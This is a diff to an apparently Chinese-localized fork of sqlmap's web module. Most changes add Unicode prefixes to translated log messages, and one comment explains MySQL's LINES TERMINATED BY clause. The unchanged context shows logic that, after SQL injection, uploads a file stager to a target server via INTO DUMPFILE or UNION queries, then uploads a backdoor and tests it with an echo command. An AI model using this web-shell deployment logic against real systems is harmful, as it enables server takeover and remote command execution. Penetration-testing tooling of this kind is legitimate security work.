@@ -121,13 +121,13 @@ class Web:
             page, _, _ = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)
 
             if "File uploaded" not in page:
-                warnMsg = "无法通过web file stager上传文件到'%s'" % directory
+                warnMsg = u"无法通过web file stager上传文件到'%s'" % directory
                 logger.warn(warnMsg)
                 return False
             else:
                 return True
         else:
-            logger.error("sqlmap没有一个web后门，也没有一个web文件stager的%s" % self.webApi)
+            logger.error(u"sqlmap没有一个web后门，也没有一个web文件stager的%s" % self.webApi)
             return False
 
     def _webFileInject(self, fileContent, fileName, directory):
@@ -282,6 +282,7 @@ class Web:
                 directory += '/'
 
             # 使用LIMIT 0，1 INTO DUMPFILE方法上传文件
+            #LINES子句：在LINES子句中使用TERMINATED BY指定一行结束的标志，如“LINES TERMINATED BY '?'”表示一行以“?”作为结束标志。"
             infoMsg = u"尝试通过LIMIT'LINES TERMINATED BY'方法上传'%s'上的文件" % directory
             logger.info(infoMsg)
             self._webFileInject(stagerContent, stagerName, directory)
@@ -289,7 +290,7 @@ class Web:
             for match in re.finditer('/', directory):
                 self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                 self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
-                debugMsg = "尝试查看该文件是否可以从'%s'访问" % self.webStagerUrl
+                debugMsg = u"尝试查看该文件是否可以从'%s'访问" % self.webStagerUrl
                 logger.debug(debugMsg)
 
                 uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
@@ -301,11 +302,11 @@ class Web:
 
             # 退回到UNION查询文件上传方法
             if not uploaded:
-                warnMsg = "无法在'%s'中上传文件" % directory
+                warnMsg = u"无法在'%s'中上传文件" % directory
                 singleTimeWarnMessage(warnMsg)
 
                 if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
-                    infoMsg = "尝试通过UNION方法将文件上传到'%s'上" % directory
+                    infoMsg = u"尝试通过UNION方法将文件上传到'%s'上" % directory
                     logger.info(infoMsg)
 
                     stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
@@ -325,7 +326,7 @@ class Web:
                         self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                         self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
 
-                        debugMsg = "正在尝试查看文件是否可以从'%s'访问" % self.webStagerUrl
+                        debugMsg = u"正在尝试查看文件是否可以从'%s'访问" % self.webStagerUrl
                         logger.debug(debugMsg)
 
                         uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
@@ -339,8 +340,8 @@ class Web:
                 continue
 
             if "<%" in uplPage or "<?" in uplPage:
-                warnMsg = "文件stager上传在'%s', " % directory
-                warnMsg += "但不动态解释"
+                warnMsg = u"文件stager上传在'%s', " % directory
+                warnMsg += u"但不动态解释"
                 logger.warn(warnMsg)
                 continue
 
@@ -348,7 +349,7 @@ class Web:
                 kb.data.__EVENTVALIDATION = extractRegexResult(EVENTVALIDATION_REGEX, uplPage)
                 kb.data.__VIEWSTATE = extractRegexResult(VIEWSTATE_REGEX, uplPage)
 
-            infoMsg = "文件stager已成功上传到'%s' - %s" % (directory, self.webStagerUrl)
+            infoMsg = u"文件stager已成功上传到'%s' - %s" % (directory, self.webStagerUrl)
             logger.info(infoMsg)
 
             if self.webApi == WEB_API.ASP:
@@ -369,13 +370,13 @@ class Web:
 
             else:
                 if not self.webUpload(backdoorName, posixToNtSlashes(directory) if Backend.isOs(OS.WINDOWS) else directory, content=backdoorContent):
-                    warnMsg = "后门没有通过file stager成功上传，"
-                    warnMsg += "这可能是因为运行Web服务器进程的用户没有权限"
-                    warnMsg += "在运行DBMS进程的用户文件夹中上传文件，因为没有写入权限，"
-                    warnMsg += "或者因为DBMS和Web服务位于不同的服务器上"
+                    warnMsg = u"后门没有通过file stager成功上传，"
+                    warnMsg += u"这可能是因为运行Web服务器进程的用户没有权限"
+                    warnMsg += u"在运行DBMS进程的用户文件夹中上传文件，因为没有写入权限，"
+                    warnMsg += u"或者因为DBMS和Web服务位于不同的服务器上"
                     logger.warn(warnMsg)
 
-                    message = "你想尝试使用与文件stager相同的方法? [Y/n] "
+                    message = u"你想尝试使用与文件stager相同的方法? [Y/n] "
 
                     if readInput(message, default='Y', boolean=True):
                         self._webFileInject(backdoorContent, backdoorName, directory)
@@ -387,18 +388,18 @@ class Web:
 
             self.webBackdoorFilePath = posixpath.join(ntToPosixSlashes(directory), backdoorName)
 
-            testStr = "命令执行测试"
+            testStr = u"命令执行测试"
             output = self.webBackdoorRunCmd("echo %s" % testStr)
 
             if output == "0":
-                warnMsg = "后门已经上传，但缺少运行系统命令的必需权限"
+                warnMsg = u"后门已经上传，但缺少运行系统命令的必需权限"
                 raise SqlmapNoneDataException(warnMsg)
             elif output and testStr in output:
-                infoMsg = "后门已经成功 "
+                infoMsg = u"后门已经成功 "
             else:
-                infoMsg = "后门可能已经成功 "
+                infoMsg = u"后门可能已经成功 "
 
-            infoMsg += "上传到'%s' - " % self.webDirectory
+            infoMsg += u"上传到'%s' - " % self.webDirectory
             infoMsg += self.webBackdoorUrl
             logger.info(infoMsg)
 
